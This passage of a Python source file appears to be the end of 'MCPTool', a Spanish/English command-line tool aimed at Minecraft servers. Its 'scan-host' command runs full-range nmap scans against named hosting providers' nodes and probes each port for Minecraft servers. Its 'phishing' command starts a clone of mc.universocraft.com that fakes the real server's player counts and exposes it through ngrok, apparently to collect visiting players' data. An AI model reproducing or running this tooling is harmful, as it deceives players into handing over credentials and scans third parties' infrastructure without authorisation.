                                        print(blanco + "   Los datos del escaneo se guardaron en escaneos/vyxterhost/Vyxterhost" + "_" + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "_" + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + ".txt")

                                    elif idioma == "en":
                                        print(blanco + "   The scan data was saved in escaneos/vyxterhost/Vyxterhost" + "_" + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "_" + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + ".txt")
                                    
                                    archivo_escaneo_vyxter.close()
                                    lista_ip.close()
                                    os.remove("nodos_vyxter_temp.txt")
                                    os.remove("vyxter_temp.txt")

                                except:
                                    print("Error desconocido.")

                            except:
                                if idioma == "es":
                                    print("")
                                    print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Error de conexión.")

                                elif idioma == "en":
                                    print("")
                                    print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Connection error.")

                        if host == "holyhosting":
                            try:
                                nodos = ("node-premium", "node-premium1", "node-premium2", "node-ashburn", "node-newyork", "node-valdivia", "node-dallas", "node-paris", "ca", "tx", "tx2", "fr")
                                dominio = ".holy.gg"
                                puertos_vyxter = "0-65535"

                                red = requests.get(urlmojang)

                                print("")

                                try:
                                    carpeta_escaneos()

                                    if os.path.isdir("escaneos/holyhosting"):
                                        pass

                                    else:
                                        os.mkdir("escaneos/holyhosting")

                                    lista_nodos = open("nodos_holyhosting_temp.txt", "w+")

                                    fecha = datetime.now()

                                    archivo_escaneo_holyhosting = open("escaneos/holyhosting/Holyhosting" + "_" + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "_" + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + ".txt", "w")
                                    archivo_escaneo_holyhosting.write("MCPTool @wrrulos \n\n")

                                    if idioma == "es":

                                        archivo_escaneo_holyhosting.write("Escaneo de Holyhosting \n\n")
                                        archivo_escaneo_holyhosting.write("Información: \n\n")
                                        archivo_escaneo_holyhosting.write("    Fecha: " + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "\n")
                                        archivo_escaneo_holyhosting.write("    Hora: " + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + "\n\n")
                                        archivo_escaneo_holyhosting.write("Nodos encontrados: \n\n")

                                    elif idioma == "en":

                                        archivo_escaneo_holyhosting.write("Holyhosting scan \n\n")
                                        archivo_escaneo_holyhosting.write("Information: \n\n")
                                        archivo_escaneo_holyhosting.write("    Date: " + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "\n")
                                        archivo_escaneo_holyhosting.write("    Hour: " + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + "\n\n")
                                        archivo_escaneo_holyhosting.write("Found nodes: \n\n")

                                    lista_nodos.truncate(0)

                                    for nodo in nodos:

                                        try:
                                            ip = socket.gethostbyname(str(nodo) + str(dominio))

                                            lista_nodos.write("\n")
                                            lista_nodos.write(str(ip) + "\n")
                                            archivo_escaneo_holyhosting.write("Nodo: " + str(nodo) + str(dominio) + "    IP: " + str(ip) + "\n")

                                        except:
                                            pass

                                    lista_nodos.close()

                                    archivo_escaneo_holyhosting.write("\n")

                                    lista_ip = open("nodos_holyhosting_temp.txt", "r")

                                    for linea in lista_ip:

                                        ip = lista_ip.readline()

                                        ip = ip.replace("\n", "")

                                        os.system("nmap -p " + puertos_vyxter + " -T4 -v -oN holyhosting_temp.txt " + ip + " >nul")

                                        print("")

                                        escaneo_holyhosting = open("holyhosting_temp.txt", "r", encoding="utf8") 

                                        resultado_holyhosting = escaneo_holyhosting.read()

                                        resultados = resultado_holyhosting.split('Nmap scan report for ')
 
                                        for resultado in resultados:
                                            puertos = re.findall(r'([0-9]+)/tcp', resultado)

                                            for puerto in puertos:
                                                try:
                                                    sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
                                                    sckt.settimeout(2);
                                                    sckt.connect((ip, int(puerto)));
                                                    sckt.send(b"\xfe\x01");
                                                    datos = sckt.recv(1024)[3:].decode("utf-16be")[3:].split("\x00")
                                                    sckt.close()

                                                    version = re.sub(r'§[a-zA-Z0-9]', '', datos[1].strip().replace('  ', '').replace('  ', ''))
                                                    motd = re.sub(r'§[a-zA-Z0-9]', '', datos[2].strip().replace('  ', '').replace('  ', ''))
                                                    jugadores = re.sub(r'§[a-zA-Z0-9]', '', f'{datos[3]}/{datos[4]}'.strip().replace('  ', '').replace('  ', ''))

                                                    if idioma == "es":
                                                        print(blanco + "    [" + lverde + "√" + blanco + "] " + verde + "Servidor encontrado:")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print(blanco + "        MOTD: " + lcyan + motd)
                                                        print(blanco + "        Versión: " + lcyan + version)
                                                        print(blanco + "        Jugadores: " + lcyan + jugadores)
                                                        print("")
                                                        archivo_escaneo_holyhosting.write("[+] Servidor encontrado: \n\n")
                                                        archivo_escaneo_holyhosting.write("    IP: " + str(ip) + ":" + str(puerto) + "\n")
                                                        archivo_escaneo_holyhosting.write("    MOTD: " + str(motd) + "\n")
                                                        archivo_escaneo_holyhosting.write("    Versión: " + str(version) + "\n")
                                                        archivo_escaneo_holyhosting.write("    Jugadores: " + str(jugadores) + "\n\n")


                                                    elif idioma == "en":
                                                        print(blanco + "    [" + lverde + "√" + blanco + "] " + verde + "Server found:")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print(blanco + "        MOTD: " + lcyan + motd)
                                                        print(blanco + "        Versión: " + lcyan + version)
                                                        print(blanco + "        Players: " + lcyan + jugadores)
                                                        print("")
                                                        archivo_escaneo_holyhosting.write("[+] Server found: \n\n")
                                                        archivo_escaneo_holyhosting.write("    IP: " + str(ip) + ":" + str(puerto) + "\n")
                                                        archivo_escaneo_holyhosting.write("    MOTD: " + str(motd) + "\n")
                                                        archivo_escaneo_holyhosting.write("    Versión: " + str(version) + "\n")
                                                        archivo_escaneo_holyhosting.write("    Players: " + str(jugadores) + "\n\n")

                                                except socket.timeout:
                                                    if idioma == "es":
                                                        print(blanco + "    [" + lrojo + "-" + blanco + "] " + verde + "Servidor encontrado " + rojo + "(tiempo agotado)" + verde + ":")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print("")
                                                        archivo_escaneo_holyhosting.write("[-] Servidor encontrado (Apagado)     IP: " + str(ip) +  ":" + str(puerto) + "\n\n")

                                                    elif idioma == "en":
                                                        print(blanco + "    [" + lrojo + "-" + blanco + "] " + verde + "Servidor found: " + rojo + "(time out)" + verde + ":")
                                                        print("")
                                                        print(blanco + "        IP: " + lcyan + ip + ":" + puerto)
                                                        print("")
                                                        archivo_escaneo_holyhosting.write("[-] Server found (Offline)     IP: " + str(ip) +  ":" + str(puerto) + "\n\n")

                                                except:
                                                    pass

                                        escaneo_holyhosting.close()
                                    
                                    if idioma == "es":
                                        print(blanco + "   Los datos del escaneo se guardaron en escaneos/holyhosting/Holyhosting" + "_" + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "_" + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + ".txt")

                                    elif idioma == "en":
                                        print(blanco + "   The scan data was saved in escaneos/holyhosting/Holyhosting" + "_" + str(fecha.day) + "-" + str(fecha.month) + "-" + str(fecha.year) + "_" + str(fecha.hour) + "." + str(fecha.minute) + "." + str(fecha.second) + ".txt")
                                    
                                    archivo_escaneo_holyhosting.close()
                                    lista_ip.close()
                                    os.remove("holyhosting_temp.txt")
                                    os.remove("nodos_holyhosting_temp.txt")

                                except:
                                    print("Error desconocido.")

                            except:
                                if idioma == "es":
                                    print("")
                                    print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Error de conexión.")

                                elif idioma == "en":
                                    print("")
                                    print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Connection error.")

                        else:
                            if idioma == "es":
                                print("")
                                print(blanco + "    Usa: scan-host [host]")
                                print(blanco + "    Hosts disponibles: " + verde + "vyxterhost" + lnegro + " - " + verde + "holyhosting" + lnegro + " - " + verde + "minehost")

                            elif idioma == "en":
                                print("")
                                print(blanco + "    Usage: scan-host [host]")
                                print(blanco + "    Hosts available: " + verde + "vyxterhost" + lnegro + " - " + verde + "holyhosting" + lnegro + " - " + verde + "minehost")       
                    except:
                        if idioma == "es":
                            print("")
                            print(blanco + "    Usa: scan-host [host]")
                            print(blanco + "    Hosts disponibles: " + verde + "vyxterhost" + lnegro + " - " + verde + "holyhosting" + lnegro + " - " + verde + "minehost")

                        elif idioma == "en":
                            print("")
                            print(blanco + "    Usage: scan-host [host]")
                            print(blanco + "    Hosts available: " + verde + "vyxterhost" + lnegro + " - " + verde + "holyhosting" + lnegro + " - " + verde + "minehost")

                except:
                    if idioma == "es":
                        print("")
                        print(blanco + "    Usa: scan-host [host]")
                        print(blanco + "    Hosts disponibles: " + verde + "vyxterhost" + lnegro + " - " + verde + "holyhosting" + lnegro + " - " + verde + "minehost")

                    elif idioma == "en":
                        print("")
                        print(blanco + "    Usage: scan-host [host]")
                        print(blanco + "    Hosts available: " + verde + "vyxterhost" + lnegro + " - " + verde + "holyhosting" + lnegro + " - " + verde + "minehost")

            elif comando == "set-language":
                try:
                    idiomacmd = argumento[1]
                    try:
                        if idiomacmd == "es":

                            archivo_idioma_cmd = open("datos/idioma", "w+")
                            archivo_idioma_cmd.truncate(0)
                            archivo_idioma_cmd.write("es")
                            archivo_idioma_cmd.close()

                            print("")
                            print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "El idioma fue cambiado a Español.")
                            print("")
                            print(blanco + "    [" + verde + "+" + blanco + "] " + blanco + "Reinicia MCPTool para aplicar los cambios.")

                        elif idiomacmd == "en":

                            archivo_idioma_cmd = open("datos/idioma", "w+")
                            archivo_idioma_cmd.truncate(0)
                            archivo_idioma_cmd.write("en")
                            archivo_idioma_cmd.close()

                            print("")
                            print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "The language was changed to Spanish.")
                            print("")
                            print(blanco + "    [" + verde + "+" + blanco + "] " + blanco + "Restart MCPTool to apply the changes.")


                    except:
                        if idioma == "es":
                            print("")
                            print(blanco + "    Usa: set-language [idioma]")
                            print(blanco + "    Idiomas disponibles: " + verde + "es" + lnegro + " - " + verde + "en")

                        elif idioma == "en":
                            print("")
                            print(blanco + "    Usage: set-language [language]")
                            print(blanco + "    Languages available: " + verde + "es" + lnegro + " - " + verde + "en")

                except:
                    if idioma == "es":
                        print("")
                        print(blanco + "    Usa: set-language [idioma]")
                        print(blanco + "    Idiomas disponibles: " + verde + "es" + lnegro + " - " + verde + "en")

                    elif idioma == "en":
                        print("")
                        print(blanco + "    Usage: set-language [language]")
                        print(blanco + "    Languages available: " + verde + "es" + lnegro + " - " + verde + "en")


            elif comando == "phishing":
                try:
                    servidor = argumento[1]
                    try:
                        if servidor == "mc.universocraft.com":
                            try:
                                respuesta = requests.get(urlmcsrv + servidor)
                                respuesta_json = respuesta.json()

                                jugadores_online = respuesta_json["players"]["online"]
                                jugadores_maximo = respuesta_json["players"]["max"]

                                archivo_configplayers = open("phishing/mc.universocraft.com/plugins/FakePlayers/config.yml", "w+")
                                archivo_configplayers.truncate(0)
                                archivo_configplayers.write("Enabled: true \n")
                                archivo_configplayers.write("Add Real Players: true \n")
                                archivo_configplayers.write("Online Players: " + str(jugadores_online) + "\n")
                                archivo_configplayers.write("Max Players: " + str(jugadores_maximo))
                                archivo_configplayers.close()

                                print("")

                                if idioma == "es":
                                    print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "Iniciando servidor...")

                                elif idioma == "en":
                                    print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "Starting server...")

                                os.system("cd phishing && cd mc.universocraft.com && start start.bat ")
                                time.sleep(4)
                                print("")

                                if idioma == "es":
                                    print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "Iniciando ngrok...")

                                elif idioma == "en":
                                    print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "Starting ngrok...")

                                os.system("start ngrok.exe tcp 25565")

                                archivo_datos_phishing = open("phishing/mc.universocraft.com/datos.txt", "w+")
                                archivo_datos_phishing.truncate(0)
                                archivo_datos_phishing.close()

                                print("")

                                if idioma == "es":
                                    ipngrok = input(blanco + "    [" + verde + "#" + blanco + "] Ingrese la dirección de Ngrok (por ejemplo, 2.tcp.ngrok.io) » " + verde)
                                    puertongrok = input(blanco + "    [" + verde + "#" + blanco + "] Escribe el puerto de Ngrok. (por ejemplo, 18018) » " + verde)

                                elif idioma == "en":
                                    ipngrok = input(blanco + "    [" + verde + "#" + blanco + "] Enter the Ngrok address (for example, 2.tcp.ngrok.io) » " + verde)
                                    puertongrok = input(blanco + "    [" + verde + "#" + blanco + "] Write the port of Ngrok. (for example, 18018) » " + verde)
                                    
                                ip_phishing = socket.gethostbyname(str(ipngrok))

                                archivo_ipp = open("phishing/mc.universocraft.com/ip_phishing.txt", "w+")
                                archivo_ipp.truncate(0)
                                archivo_ipp.write(ip_phishing + ":" + puertongrok)
                                archivo_ipp.close()

                                time.sleep(3)

                                os.system("cd phishing && cd mc.universocraft.com && start python consola.py")

                                print("")

                            except:
                                numaleatorio = randint(1000,8000)
                                archivo_configplayers = open("phishing/mc.universocraft.com/plugins/FakePlayers/config.yml", "w+")
                                archivo_configplayers.truncate(0)
                                archivo_configplayers.write("Enabled: true \n")
                                archivo_configplayers.write("Add Real Players: true \n")
                                archivo_configplayers.write("Online Players: " + str(numaleatorio) + " \n")
                                archivo_configplayers.write("Max Players: 20000")
                                archivo_configplayers.close()

                                print("")

                                if idioma == "es":
                                    print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "Iniciando servidor...")

                                elif idioma == "en":
                                    print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "Starting server...")

                                os.system("cd phishing && cd mc.universocraft.com && start start.bat ")
                                time.sleep(4)
                                print("")

                                if idioma == "es":
                                    print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "Iniciando ngrok...")

                                elif idioma == "en":
                                    print(blanco + "    [" + verde + "+" + blanco + "] " + lverde + "Starting ngrok...")

                                os.system("start ngrok.exe tcp 25565")

                                archivo_datos_phishing = open("phishing/mc.universocraft.com/datos.txt", "w+")
                                archivo_datos_phishing.truncate(0)
                                archivo_datos_phishing.close()

                                print("")

                                if idioma == "es":
                                    ipngrok = input(blanco + "    [" + verde + "#" + blanco + "] Ingrese la dirección de Ngrok (por ejemplo, 2.tcp.ngrok.io) » " + verde)
                                    puertongrok = input(blanco + "    [" + verde + "+" + blanco + "] Escribe el puerto de Ngrok. (por ejemplo, 18018) » " + verde)

                                elif idioma == "en":
                                    ipngrok = input(blanco + "    [" + verde + "#" + blanco + "] Enter the Ngrok address (for example, 2.tcp.ngrok.io) » " + verde)
                                    puertongrok = input(blanco + "    [" + verde + "+" + blanco + "] Write the port of Ngrok. (for example, 18018) » " + verde)
                                    
                                ip_phishing = socket.gethostbyname(str(ipngrok))

                                archivo_ipp = open("phishing/mc.universocraft.com/ip_phishing.txt", "w+")
                                archivo_ipp.truncate(0)
                                archivo_ipp.write(ip_phishing + ":" + puertongrok)
                                archivo_ipp.close()

                                time.sleep(3)

                                os.system("cd phishing && cd mc.universocraft.com && start python consola.py")

                                print("")
                        else:
                            if idioma == "es":
                                print("")
                                print(blanco + "    Usa: phishing [server]")
                                print(blanco + "    Servidores disponibles: " + verde + "mc.universocraft.com")

                            elif idioma == "en":
                                print("")
                                print(blanco + "    Usage: phishing [server]")
                                print(blanco + "    Available servers: " + verde + "mc.universocraft.com")

                    except:
                        print("")
                        print(blanco + "    [" + rojo + "-" + blanco + "]" + lrojo + " Error.")

                except:
                    if idioma == "es":
                        print("")
                        print(blanco + "    Usa: phishing [server]")
                        print(blanco + "    Servidores disponibles: " + verde + "mc.universocraft.com")

                    elif idioma == "en":
                        print("")
                        print(blanco + "    Usage: phishing [server]")
                        print(blanco + "    Available servers: " + verde + "mc.universocraft.com")
                    
                                              
            else:
                if idioma == "es":
                    print("")
                    print(lnegro + "    [" + rojo + "-" + lnegro + "]" + lrojo + " Comando desconocido. Escribe help para ver los comandos disponibles.")

                elif idioma == "en":
                    print("")
                    print(lnegro + "    [" + rojo + "-" + lnegro + "]" + lrojo + " Unknown command. Type help to see the available commands.")       

        except:
            if idioma == "es":
                print("")
                print(lnegro + "    [" + rojo + "-" + lnegro + "]" + lrojo + " Comando desconocido. Escribe help para ver los comandos disponibles.")

            elif idioma == "en":
                print("")
                print(lnegro + "    [" + rojo + "-" + lnegro + "]" + lrojo + " Unknown command. Type help to see the available commands.")

menu()
